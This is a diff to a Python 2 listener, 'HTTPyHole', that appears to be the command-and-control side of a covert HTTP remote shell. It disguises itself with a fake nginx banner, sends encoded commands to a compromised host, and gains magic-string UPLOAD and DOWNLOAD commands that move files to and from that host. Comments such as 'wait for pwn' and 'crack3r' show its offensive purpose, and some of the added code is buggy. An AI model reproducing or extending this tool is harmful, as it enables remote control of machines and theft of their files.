@@ -24,6 +24,7 @@ import BaseHTTPServer
 import base64
 import sys
 import os
+import bz2
 
 # These can be changed but must match your shell,
 BLOCK_SIZE = 32
@@ -31,11 +32,12 @@ INIT_CONNECTION_STRING = "737060cd8c284d8af7ad3082f209582d" # change this or ran
 CONT_CONNECTION_STRING = "227061cd8c2a4d8af7ab2132f203453a"
 FINI_CONNECTION_STRING = "143061cdac2a4d8ff7ad213432cd413a"
 
-DEBUG=False
-PORT = 80
+MAGIC_CMD_STRING = "M4G1C"
+DEBUG = False
+BIND_PORT = 80
 SERVER_VERSION="nginx/0.7.67"
 VERSION="HTTPyHole Listener v0.1"
-WAIT_TIME = 0  # TODO: negotiate between shell and listener a wait time between http requests..
+wait_time = 0  # TODO: negotiate between shell and listener a wait time between http requests..
 
 payloads_to_open = []
 payloads = []
@@ -76,7 +78,7 @@ def parse_args(argv):
     
         for opt, arg in options:
             if opt in ('-p', '--port'):
-                PORT = int(arg)
+                BIND_PORT = int(arg)
             elif opt in ('-e', '--execute'):
                 batch_cmds.append(arg)
             elif opt in ('-b', '--batch-execute'):
@@ -84,7 +86,7 @@ def parse_args(argv):
             elif opt in ('-d', '--debug'):
                 DEBUG = True
             elif opt in ('-w', '--wait'):
-                WAIT_TIME = int(arg)
+                wait_time = int(arg)
             elif opt in ('-v', '--version'):
                 print VERSION
                 sys.exit(0)
@@ -111,12 +113,27 @@ w=placeholder()
 def do_FAKE_RESPONSE(http):
     return ""
 
+
+def hole_cmd(http, cmd):
+    # essentially ends up looking like MAGICUPLOAD /yourfile/hereMAGICfile-contents
+    if (cmd[len(MAGIC_CMD_STRING):].find("UPLOAD") == 0):
+        filename=cmd[len(MAGIC_CMD_STRING)+len("UPLOAD "):]
+        cmd = cmd + MAGIC_CMD_STRING + open(filename).read() + MAGIC_CMD_STRING
+        return cmd
+    if(cmd[len(MAGIC_CMD_STRING):].find("DOWNLOAD")):
+        filename=cmd[len(MAGIC_CMD_STRING)+len("DOWNLOAD "):]
+        w.download = filename
+        return cmd
+
 def handle_cmd(http):
+    w.download = ""
     if(batch_cmds.__len__() == 0):
         cmd = raw_input("$:")
     else:
         cmd = batch_cmds.pop(0)
     w.send_count = 0
+    if(cmd.find(MAGIC_CMD_STRING) == 0):
+        cmd=hole_cmd(http,cmd) 
     print "Sending command: " + cmd
     cmd = base64.b64encode(cmd)
     w.send_size = len(cmd) / BLOCK_SIZE
@@ -149,7 +166,13 @@ def handle_response(http):
             for chunks in w.response_blocks:
                 response = response + chunks
             response = base64.b64decode(response)
-            print response
+            response = bz2.decompress(response)
+            if (w.download):
+                open("hole_dl").write(response)
+                print "Downloaded " + w.download + " from host to file: hole_dl , rename it yourself crack3r"
+                w.download = ""
+            else:
+                print response
             w.response_count=0
 
 
@@ -177,7 +200,9 @@ class HTTPHandler (BaseHTTPServer.BaseHTTPRequestHandler):
 
 if __name__ == "__main__":
     parse_args(sys.argv)
-    svr = BaseHTTPServer.HTTPServer(('', PORT), HTTPHandler) # wait for pwn
+    print "Listening on port: " + str(BIND_PORT)
+    print "Wait time set to: " + str(wait_time)
+    svr = BaseHTTPServer.HTTPServer(('', BIND_PORT), HTTPHandler) # wait for pwn
     try:
         svr.serve_forever()
     except KeyboardInterrupt:
